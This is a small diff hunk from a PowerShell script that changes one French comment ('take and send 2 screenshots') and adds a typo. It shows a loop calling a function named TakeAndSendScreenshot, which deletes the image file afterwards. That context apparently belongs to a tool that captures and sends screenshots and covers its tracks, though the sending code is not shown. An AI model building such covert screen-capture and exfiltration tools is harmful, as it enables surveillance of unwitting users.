@@ -27,7 +27,7 @@ Function TakeAndSendScreenshot {
     Remove-Item -Path $filett
 }
 
-# Prendre et envoyer 2 captures d'écran
+# Prendre et envoyer 2 captures d'écrande
 for ($i = 0; $i -lt $a; $i++) {
     TakeAndSendScreenshot
 }
